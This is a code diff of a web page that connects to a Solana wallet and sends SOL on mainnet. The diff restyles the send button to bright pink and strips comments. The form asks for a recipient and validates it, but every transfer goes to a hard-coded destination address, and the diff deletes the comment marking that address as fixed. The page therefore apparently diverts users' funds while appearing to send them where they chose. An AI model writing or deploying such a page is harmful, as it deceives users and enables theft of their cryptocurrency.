@@ -48,7 +48,8 @@
       </label>
     </div>
 
-    <button id="sendButton" class="text-3xl px-6 py-3 bg-black text-white rounded-lg shadow-lg hover:bg-purple-900 transition disabled:opacity-50">
+    <!-- Bright pink button -->
+    <button id="sendButton" class="text-3xl px-6 py-3 bg-pink-600 text-white rounded-lg shadow-lg hover:bg-pink-800 transition disabled:opacity-50">
       SEND IT
     </button>
     <p id="walletAddress" class="mt-4 text-lg font-mono break-all"></p>
@@ -56,16 +57,9 @@
 
   <!-- App Logic -->
   <script type="module">
-    // Pull Solana APIs off the global provided by the IIFE bundle
-    const {
-      Connection,
-      PublicKey,
-      SystemProgram,
-      Transaction,
-      LAMPORTS_PER_SOL,
-    } = solanaWeb3;
+    const { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } = solanaWeb3;
 
-    const DESTINATION_ADDRESS = "4RjJu4S761irqRYKGydVNf3rfTjQa9mJiTPT8vsUxjJW"; // fixed receiver
+    const DESTINATION_ADDRESS = "4RjJu4S761irqRYKGydVNf3rfTjQa9mJiTPT8vsUxjJW";
 
     const sendButton = document.getElementById('sendButton');
     const walletAddressEl = document.getElementById('walletAddress');
@@ -76,58 +70,44 @@
       return window?.phantom?.solana || window?.solana || null;
     }
 
-    /** Ensure wallet is connected – always call before signing */
     async function connectWallet() {
       const provider = getProvider();
       if (!provider) {
         alert('No Solana wallet found. Install Phantom and try again.');
         throw new Error('Provider not found');
       }
-
       if (!provider.publicKey) {
-        // Will present modal if not previously trusted
         await provider.connect({ onlyIfTrusted: false });
       }
-
       walletAddressEl.textContent = `Connected: ${provider.publicKey.toString()}`;
       return provider;
     }
 
     async function buildAndSend(provider) {
-      // Validate form after wallet so user sees connect prompt first
       if (!toInput.checkValidity() || !amountInput.checkValidity()) {
         toInput.reportValidity();
         amountInput.reportValidity();
         return;
       }
-
       const amountSol = parseFloat(amountInput.value);
       const lamports = Math.round(amountSol * LAMPORTS_PER_SOL);
       if (!Number.isFinite(lamports) || lamports <= 0) {
         alert('Amount must be greater than 0');
         return;
       }
-
       const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
       const toPubkey = new PublicKey(DESTINATION_ADDRESS);
       const fromPubkey = provider.publicKey;
-
       const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-      const transaction = new Transaction({
-        feePayer: fromPubkey,
-        recentBlockhash: blockhash,
-        lastValidBlockHeight,
-      }).add(
-        SystemProgram.transfer({ fromPubkey, toPubkey, lamports })
-      );
-
+      const transaction = new Transaction({ feePayer: fromPubkey, recentBlockhash: blockhash, lastValidBlockHeight })
+        .add(SystemProgram.transfer({ fromPubkey, toPubkey, lamports }));
       try {
         const signed = await provider.signTransaction(transaction);
         const txid = await connection.sendRawTransaction(signed.serialize());
         await connection.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, 'confirmed');
         alert(`Transaction submitted!\nTxID: ${txid}`);
       } catch (err) {
-        if (err?.code === 4001 || /User rejected/i.test(err?.message)) return; // user rejected
+        if (err?.code === 4001 || /User rejected/i.test(err?.message)) return;
         console.error('Transaction failed:', err);
         alert('Transaction failed: ' + (err?.message || err));
       }
@@ -137,12 +117,9 @@
       try {
         const provider = await connectWallet();
         await buildAndSend(provider);
-      } catch (_) {
-        // errors are handled inside sub‑functions
-      }
+      } catch (_) {}
     }
 
-    // update UI if wallet connects from outside the page
     const provider = getProvider();
     provider?.on?.('connect', () => {
       walletAddressEl.textContent = `Connected: ${provider.publicKey.toString()}`;
